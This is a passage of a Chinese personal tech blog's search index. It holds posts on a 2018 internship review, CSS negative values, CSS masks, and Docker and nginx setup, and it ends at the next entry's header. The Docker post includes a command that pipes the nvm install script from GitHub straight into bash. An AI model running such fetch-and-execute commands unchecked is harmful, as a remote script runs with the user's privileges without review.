<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2018年总结</title>
    <url>/2019/01/28/2018%E5%B9%B4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;转眼间呢 2018年就过去 从我开始写这个博客 也过去整整一年了。这一年里自己也经历了许多的事情吧，从今年刚开始的时候十分浮躁什么都想学，什么也都在学 各种框架。其实在现在看来好像没有太大的用处，但是也看到了不同语言在某些问题上的处理思路。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;然后从家里到学校之后，还是一样自己每天看视屏，然后就开始看一些招聘信息，那个时候也差不多春招了吧 ，自己参加的第一个面试就是在金牛区那边吧，第一次还是超级紧张，虽然自己觉得自己回答的不错，但是可能题做的太差了吧 然后是美团，通过了笔试，然后去面试的时候经历了自己第一次自我怀疑，自己好多的东西都不会，面试的哥哥也直接说我需要多补一下基础知识。通过这次面试自己也也发现很多的问题。</p>
<p><hr><br>&nbsp;&nbsp;&nbsp;然后到45月份的时候，基本上去面试自己的感觉还是很不错的，但是每次也能发现一些新的问题，但是感觉自己都还是再进步。6月份的时候找到了第一份实习，自己还是超级开心的，然后自己第一次上班，公司发的mac 自己也不会操作 还要不停的百度 也不好意思问别人 工作的第一个项目也犯了很多低级错误 自己也超级不好意思的 确实自己学和用于实际的工作上海市有很大的不同，然后自己也学会了切图 比较贴近于实际 哈哈 自己这要就在写一些活动 要与产品设计等等沟通一些动画呀 逻辑上的一些问题。自己也学了解了一些开发中的一些专有名词，比如提测、灰测、冒烟等，一些开发的流程。</p>
<p><hr><br>&nbsp;&nbsp;&nbsp;然后过程中自己也经常犯错，出bug。但也在进步吧，慢慢自己也不仅仅是写前端了，也开始用node+express写接口，操作数据库，倒表导数据。自己也能负责一个独立的项目了。但项目基本上都是用vue写的，所以感觉自己技术栈还是有点不扎实，还是需要继续学习。</p>
<p><hr><br>&nbsp;&nbsp;&nbsp;很快自己就实习大半年了，新的一年会有更多挑战更多等待着自己，不管未来风气怎么变化吧，最重要的还是要不断地充实自己，多学，多问，多实践。</p>
]]></content>
      <categories>
        <category>生活分享</category>
      </categories>
      <tags>
        <tag>生活分享</tag>
      </tags>
  </entry>
  <entry>
    <title>Css中负值的使用</title>
    <url>/2019/08/18/Css%E4%B8%AD%E8%B4%9F%E5%80%BC%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;今天在网上看到一篇你所不知道的 CSS 负值技巧与细节，看了之后对于一些属性的使用有了新的了解，于是自己就都在本地试了试水，下面就来介绍一下这些属性吧：<br><a id="more"></a></p>
<h3 id="outline-offset"><a href="#outline-offset" class="headerlink" title="outline-offset"></a>outline-offset</h3><hr>
<blockquote>
<p>我们都知道outline属性是给box加上一个边框，而outline-offset则是设置边框轮廓的偏移量的属性<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#eee</span>;</span><br><span class="line">  <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">20px</span> solid <span class="number">#424242</span>;</span><br><span class="line">  <span class="attribute">outline-offset</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>添加正的值则向外偏移，负的值则想内偏移<br><img src="/images/f1.png" alt="My Pic"></li>
</ul>
<blockquote>
<p>但修改 outline-offset 到一个合适的负值 ，那么在恰当的时候，outline 边框就会向内缩进为一个加号。根据作者的尝试这里是118px<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#eee</span>;</span><br><span class="line">  <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">outline</span>: <span class="number">20px</span> solid <span class="number">#424242</span>;</span><br><span class="line">  <span class="attribute">outline-offset</span>: -<span class="number">118px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/images/f2.png" alt="My Pic"></p>
<blockquote>
<p>添加动画之后可以看到其变化的过程</p>
</blockquote>
<p><img src="/images/f3.gif" alt="My Pic"></p>
<blockquote>
<p>作者也总结了实现这个效果所需要的条件<br>要使用负的 outline-offset 生成一个加号有一些简单的限制：容器得是个正方形outline 边框本身的宽度不能太小outline-offset 负值 x 的取值范围为: -(容器宽度的一半 + outline宽度的一半) &lt; x &lt; -(容器宽度的一半 + outline宽度)</p>
</blockquote>
<h3 id="单侧投影"><a href="#单侧投影" class="headerlink" title="单侧投影"></a>单侧投影</h3><hr>
<blockquote>
<p>这个问题自己之前也遇到过这个需求，也从网上知道了这个问题的解决问题，先来看看box-shadow的参数<br>以 box-shadow: 1px 1px 1px 1px #000 为例，4 个数值的含义分别是，x 方向偏移值、y 方向偏移值 、模糊半径、扩张半径。其中方向偏移值和扩张半径都可以为负值 当我们有实现单侧阴影的需求时 我们可能会这样写：<br><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.shadow</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">3px</span> <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<ul>
<li>会发现虽然我们只设置了纵向的阴影但是由于设置了模糊半径其他边也会受到影响</li>
</ul>
<p><img src="/images/f4.png" alt="My Pic"></p>
<blockquote>
<p>解决：使用和模糊半径相等的负值扩张半径来抵消 那么我们将看不到任何阴影，因为生成的阴影将被包含在原来的元素之下</p>
</blockquote>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span><span class="selector-class">.shadow</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">3px</span> <span class="number">5px</span> -<span class="number">5px</span> <span class="number">#000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/f5.png" alt="My Pic"></p>
<h3 id="scale"><a href="#scale" class="headerlink" title="scale"></a>scale</h3><hr>
<blockquote>
<p>缩放还能是负数么 emmm  好吧 真的可以 看下demo吧</p>
</blockquote>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.scale</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">300px</span>;</span><br><span class="line">  <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>) scale(-<span class="number">1</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/f6.png" alt="My Pic"></p>
<ul>
<li>居然结果是翻转了180°</li>
</ul>
<h3 id="letter-spacing"><a href="#letter-spacing" class="headerlink" title="letter-spacing"></a>letter-spacing</h3><hr>
<blockquote>
<p>这个大家应该都用过，是用来控制文本之间距离的，但是它的负值应该大家没试过吧  用它的负值可以实现倒序排列文字</p>
</blockquote>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.letter_spacing</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">left</span>:<span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">  <span class="attribute">letter-spacing</span>: <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">animation</span>: move <span class="number">10s</span> infinite;</span><br><span class="line">&#125;</span><br><span class="line">@keyframes move &#123;</span><br><span class="line">  40% &#123;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: <span class="number">36px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  80% &#123;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: -<span class="number">72px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    <span class="attribute">letter-spacing</span>: -<span class="number">72px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/f7.gif" alt="My Pic"></p>
<blockquote>
<p>其他的负值还有负的<br>animation-delay 的负值<br>负值 margin<br>负 text-indent<br>更多的属性参考作者的博客 <a href="https://juejin.im/post/5d4b8707f265da03a65302bd" target="_blank" rel="noopener">参考链接</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Css</category>
      </categories>
      <tags>
        <tag>Css</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS实现镂空特效</title>
    <url>/2018/10/22/CSS%E5%AE%9E%E7%8E%B0%E9%95%82%E7%A9%BA%E7%89%B9%E6%95%88/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;今天在网上看到了一篇关于css特效的文章，其中有一个属性感觉自己从来都没有看到过，也没有用过。结果实现出来的效果还挺酷的。<br>首先给大家看一下效果吧<br><a id="more"></a><br><img src="/images/mask1.png" alt="My Pic"><br>中间部分的图片为一个不透明的svg，但是通过css中的一个属性，可以将不透明的图片变成透明。中间的背景反而偷了出来。代码如下：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>wenzi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">* &#123;</span></span><br><span class="line"><span class="undefined">padding: 0;</span></span><br><span class="line"><span class="undefined">margin: 0;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">html,</span></span><br><span class="line"><span class="undefined">body &#123;</span></span><br><span class="line"><span class="undefined">height: 100vh;</span></span><br><span class="line"><span class="undefined">width: 100vw;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">body &#123;</span></span><br><span class="line"><span class="undefined">display: flex;</span></span><br><span class="line"><span class="undefined">justify-content: center;</span></span><br><span class="line"><span class="undefined">align-items: center;</span></span><br><span class="line"><span class="undefined">flex-direction: column;</span></span><br><span class="line"><span class="undefined">font-family: "Open Sans","PingFang SC","Microsoft YaHei","Helvetica Neue","Hiragino Sans GB","WenQuanYi Micro Hei",Arial,sans-serif;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">@keyframes move &#123;</span></span><br><span class="line"><span class="undefined">0% &#123;</span></span><br><span class="line"><span class="undefined">background-position: 0 0;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">50% &#123;</span></span><br><span class="line"><span class="undefined">background-position: 100% 0;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.bg &#123;</span></span><br><span class="line"><span class="undefined">background: url(fengjing.jpg);</span></span><br><span class="line"><span class="undefined">background-size: cover;</span></span><br><span class="line"><span class="undefined">position: fixed;</span></span><br><span class="line"><span class="undefined">top: -20px;</span></span><br><span class="line"><span class="undefined">left: -20px;</span></span><br><span class="line"><span class="undefined">right: -20px;</span></span><br><span class="line"><span class="undefined">bottom: -20px;</span></span><br><span class="line"><span class="undefined">filter: blur(15px);</span></span><br><span class="line"><span class="undefined">z-index: -1;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.slogan &#123;</span></span><br><span class="line"><span class="undefined">color: white;</span></span><br><span class="line"><span class="undefined">margin-top: 24px;</span></span><br><span class="line"><span class="undefined">font-size: 36px;</span></span><br><span class="line"><span class="undefined">font-weight: 400;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">.mask &#123;</span></span><br><span class="line"><span class="undefined">/* https://sp-webfront.skypixel.com/skypixel/v2/public/website/assets/1535027674204-f6eca6369ec03e70262b58b0e25cda7b */</span></span><br><span class="line"><span class="undefined">width: 340px;</span></span><br><span class="line"><span class="undefined">height: 200px;</span></span><br><span class="line"><span class="undefined">-webkit-animation: move 40s infinite;</span></span><br><span class="line"><span class="undefined">animation: move 40s infinite;</span></span><br><span class="line"><span class="undefined">background-image: url(fengjing.jpg);</span></span><br><span class="line"><span class="undefined">background-size: cover;</span></span><br><span class="line"><span class="undefined">-webkit-mask: url(http://static.w3ctrain.com/upload_cae6fcb079f57792a47202cb67bbc04a-dji-seeklogo.com.svg);</span></span><br><span class="line"><span class="undefined">mask: url(http://static.w3ctrain.com/upload_cae6fcb079f57792a47202cb67bbc04a-dji-seeklogo.com.svg);</span></span><br><span class="line"><span class="undefined">-webkit-mask-size: cover;</span></span><br><span class="line"><span class="undefined">mask-size: cover;</span></span><br><span class="line"><span class="undefined">/* mask-mode:alpha; */</span></span><br><span class="line"><span class="undefined">/* http://static.w3ctrain.com/upload_cae6fcb079f57792a47202cb67bbc04a-dji-seeklogo.com.svg */</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bg"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mask"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"slogan"</span>&gt;</span>How can you be brave if only wonderful things happen to you<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>css的mask属性与backgroud的用法比较相似<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mask-image </span><br><span class="line">mask-mode alpha luminance</span><br><span class="line">mask-repeat</span><br><span class="line">mask-position</span><br><span class="line">mask-clip</span><br><span class="line">mask-origin</span><br><span class="line">mask-size  auto cover contain</span><br><span class="line">mask-type</span><br><span class="line">mask-composite</span><br></pre></td></tr></table></figure></p>
<p>兼容性也还不错<br><img src="/images/mask3.png" alt="My Pic"></p>
<p>最后再来一张GIF效果的图片<br><img src="/images/mask2.png" alt="My Pic"></p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker中部署静态网页</title>
    <url>/2019/09/16/Docker%E4%B8%AD%E9%83%A8%E7%BD%B2%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;上一篇关于docker的文章主要讲了docker的一些基本概念，以及一些经常使用的命令（创建、启动、停止）容器，以及进入容器之后的一些操作等。之后自己又尝试了在docker nginx上部署自己在github上的静态网页项目，下面就简单介绍一下具体的操作吧：<br><a id="more"></a></p>
<h3 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3><hr>
<blockquote>
<p>可以先查看自己本地是否有安装过nignx<br>docker image<br>如果没有安装过 可以去docker hub上寻找自己想要安装的版本 通过docker pull进行安装<br>通过docker create –name name创建相应镜像的容器<br>创建之后 通过docker container ls -a查看所有的容器<br><img src="/images/docker21.png" alt="My Pic"></p>
</blockquote>
<h3 id="启动nginx容器"><a href="#启动nginx容器" class="headerlink" title="启动nginx容器"></a>启动nginx容器</h3><hr>
<ul>
<li>一般有两种启动的方式<blockquote>
<p>通过docker start id启动自己创建的nginx容器<br>在使用 docker exec -it id bin/bash进入nginx容器中</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>或者直接使用docker run -d -p 80:80 –restart=always nginx:latest<br>参数说明： run 启动某个镜像 -d 让容器在后台运行 -p 指定端口映射，宿主机的80端口映射到容器的80端口 –restart 重启模式，设置 always，每次启动 docker 都会启动 nginx 容器。<br>需要注意的是每次使用这个命令都会创建一个新的容器</p>
<p>使用docker ps 查看运行中的容器<br><img src="/images/docker22.png" alt="My Pic"><br>这样就表明容器已经启动成功<br>可以访问相应的url 进行验证 这里就不贴图了</p>
</blockquote>
<h3 id="部署静态项目"><a href="#部署静态项目" class="headerlink" title="部署静态项目"></a>部署静态项目</h3><hr>
<ul>
<li><p>进入nignx容器中</p>
<blockquote>
<p>docker exec -it id bin/bash<br><img src="/images/docker23.png" alt="My Pic"></p>
</blockquote>
</li>
<li><p>安装git</p>
<blockquote>
<p>使用apt-get install git<br>如果报错了 可以先使用apt-get update更新一下<br>安装之后 使用git version验证一下<br><img src="/images/docker24.png" alt="My Pic"></p>
</blockquote>
</li>
<li><p>进入nginx默认网页路径中</p>
<blockquote>
<p>cd /usr/share/nginx<br>使用dir 查看当前目录的文件 会看见一个index.html</p>
</blockquote>
</li>
<li><p>使用git clone url 拉取自己打包之后的项目</p>
<blockquote>
<p><img src="/images/docker25.png" alt="My Pic"></p>
</blockquote>
</li>
<li><p>修改nginx的配置</p>
<blockquote>
<p>进入/etc/nginx/conf.d中 dir 可以看到一个default.conf<br>使用vim name 编辑改文件 如果报错 先使用apt-get install vim安装之后再运行命令<br>主要使用添加和修改location中映射的文件路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen   80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    #access_log  /var/log/nginx/host.access.log  main;</span><br><span class="line">    location / &#123;</span><br><span class="line">    root /usr/share/nginx/myresume/dist;</span><br><span class="line">    index index.html inex.htm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #error_page  404              /404.html;</span><br><span class="line"></span><br><span class="line">    # redirect server error pages to the static page /50x.html</span><br><span class="line">    #</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    proxy_pass   http://127.0.0.1;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span><br><span class="line">    #</span><br><span class="line">    #location ~ \.php$ &#123;</span><br><span class="line">    #    root           html;</span><br><span class="line">    #    fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">    #    fastcgi_index  index.php;</span><br><span class="line">    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span><br><span class="line">    #    include        fastcgi_params;</span><br><span class="line">    #&#125;</span><br><span class="line"></span><br><span class="line">    # deny access to .htaccess files, if Apache&apos;s document root</span><br><span class="line">    # concurs with nginx&apos;s one</span><br><span class="line">    #</span><br><span class="line">    #location ~ /\.ht &#123;</span><br><span class="line">    #    deny  all;</span><br><span class="line">    #&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>重启nginx</p>
<blockquote>
<p>nginx -s  reload<br><img src="/images/docker26.png" alt="My Pic"><br>部署成功</p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker的安装与初步使用</title>
    <url>/2019/09/01/Docker%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近看了一些docker的文章，于是想自己试试手，就在本地安装了docker，并经行了一些初步的试水，后续的话还会学习如何部署项目到里面，以及实现自动化部署。下面主要是简单的介绍一下docker的安装，以及一些基本的概念和命令操作:<br><a id="more"></a></p>
<h3 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h3><blockquote>
<p>自己最开始的理解是和虚拟机类似的东西，但是相比虚拟机有很多优势比如占用的空间更小<br>相对于虚拟机的笨重，Docker则更显得轻量化，因此不会占用太多的系统资源。Docker是使用时下很火的Golang语言进行开发的，其技术核心是Linux内核的Cgroup,Namespace和AUFS类的Union FS等技术，这些技术都是Linux内核中早已存在很多年的技术，所以严格来说Docker并不是一个完全创新的技术，Docker通过这些底层的Linux技术，对Linux进程进行封装隔离，而被隔离的进程也被称为容器，完全独立于宿主机的进程。所以Docker是容器技术的一种实现，也是操作系统层面的一种虚拟化，与虚拟机通过一套硬件再安装操作系统完全不同。</p>
</blockquote>
<p>容器解决了开发与生产环境的问题</p>
<blockquote>
<p>开发人员需要在本机安装各种各样的测试环境，因此开发的项目需要软件越多，依赖越多，安装的环境也就越复杂。<br>同样的，运维人员需要为开发人员开发的项目提供生产环境，而运维人员除了应对软件之间的依赖，还需要考虑安装软件与硬件之间的兼容性问题。<br>容器就是一个不错的解决方案，容器能成为开发与运维之间沟通的语言，因为容器就像一个集装箱一样，提供了软件运行的最小化环境，将应用与其需要的环境一起打包成为镜像，便可以在开发与运维之间沟通与传输。</p>
<p>两者的区别</p>
</blockquote>
<p><img src="/images/docker1.png" alt="My Pic"></p>
<h3 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h3><blockquote>
<p>由于我的电脑是window7 只能使用Docker Toolbox来安装<br>安装连接主要是这两个:<br><a href="http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/" target="_blank" rel="noopener">http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/</a><br><a href="https://docs.docker.com/toolbox/toolbox_install_windows/" target="_blank" rel="noopener">https://docs.docker.com/toolbox/toolbox_install_windows/</a></p>
</blockquote>
<p><img src="/images/docker2.png" alt="My Pic"><br><img src="/images/docker3.png" alt="My Pic"></p>
<blockquote>
<p>安装之后会生成几个图标</p>
</blockquote>
<p><img src="/images/docker4.png" alt="My Pic"></p>
<blockquote>
<p>有一个需要注意的问题是 如果是用的自己的git，需要通过点击Docker Quickstart 属性 将目标中的git路径替换为自己的</p>
</blockquote>
<h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><blockquote>
<p>点击Docker Quickstart 启动</p>
<p><img src="/images/docker5.png" alt="My Pic"><br>测试安装是否成功</p>
<p><img src="/images/docker6.png" alt="My Pic"><br>如果显示server中有报错的话 原因应该是docker machine 相关的系统环境变量没有添加成功<br>运行docker-machine env default  执行上面输出的命令 添加系统变量即可</p>
<p>拉取镜像并运行容器<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 拉取hello-world镜像 docker pull hello-world</span><br><span class="line"># 使用hello-world运行一个容器 docker run hello-world</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/images/docker7.png" alt="My Pic"></p>
<blockquote>
<p>显示为这样的话 就说明安装成功了</p>
<p>我们可以去<a href="https://hub.docker.com" target="_blank" rel="noopener">DockerHub</a>找相关的镜像拉取</p>
</blockquote>
<ul>
<li>常用命令<blockquote>
<p>docker version &nbsp;&nbsp;&nbsp;打印docker版本<br>docker pull name:version  拉取镜像 name：名字 version：拉取版本<br>docker run name 运行一个容器<br>docker images 查看所有镜像<br>docker create –name name image 创建一个容器并指定名字 返回容器id<br>docker container ls 查看运行中的容器 docker container ls -a 查看所有的容器<br>docker ps 类似docker container ls 查看运行中的容器<br>docker exec option name 进入容器<br><img src="/images/docker8.png" alt="My Pic"><br>dockere image rm image_name/image_id  删除镜像<br>docker stop container_id 停止运行的容器<br>docker rm container_id 删除容器</p>
</blockquote>
</li>
</ul>
<h3 id="在ubuntu容器中安装node"><a href="#在ubuntu容器中安装node" class="headerlink" title="在ubuntu容器中安装node"></a>在ubuntu容器中安装node</h3><blockquote>
<p>进入容器之后 执行以下命令进行安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get update </span><br><span class="line">apt-get install wget </span><br><span class="line">wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.8/install.sh | bash </span><br><span class="line"># 安装完之后可能当前 session 读不到 nvm 命令，可以 exit 之后再进入中终端环境 </span><br><span class="line">nvm install 8.0.0 </span><br><span class="line">node -v</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 --restart=always nginx:latest</span><br></pre></td></tr></table></figure>
<blockquote>
<p>参数说明： run 启动某个镜像 -d 让容器在后台运行 -p 指定端口映射，宿主机的80端口映射到容器的80端口 –restart 重启模式，设置 always，每次启动 docker 都会启动 nginx 容器<br>输入docker ps  能看到启动的镜像 说明已经启动成功了<br><img src="/images/docker9.png" alt="My Pic"></p>
<p>如果本机为linux就可以直接访问localhost:80 访问nginx服务<br>但由于docker是运行在linux虚拟机上的，我们在Windows系统中运行docker，实际上是先在Windows下先安装了一个Linux环境，然后在这个环境中运行的docker。所以，访问服务中使用的localhost指的是这个Linux环境的地址，而不是我们的Windows。</p>
</blockquote>
<ul>
<li>解决办法</li>
</ul>
<blockquote>
<p>首先进入nginx容器中  测试虚拟机中是否可以正常访问localhost:80端口<br><img src="/images/docker10.png" alt="My Pic"><br>执行 curl <a href="http://localhost:80" target="_blank" rel="noopener">http://localhost:80</a> 如果报错command not find 则需要先安装 运行一下命令<br>apt-get update<br>apt-get install curl<br>安装完成之后 再执行命令可以看到一下输出 则说明已经启动了<br><img src="/images/docker11.png" alt="My Pic"><br>退出容器查看虚拟机地址<br>docker-machine ls<br><img src="/images/docker12.png" alt="My Pic"><br>然后就可以在浏览器中访问了</p>
<p><img src="/images/docker13.png" alt="My Pic"></p>
</blockquote>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Dom节点的遍历</title>
    <url>/2019/07/09/Dom%E8%8A%82%E7%82%B9%E7%9A%84%E9%81%8D%E5%8E%86/</url>
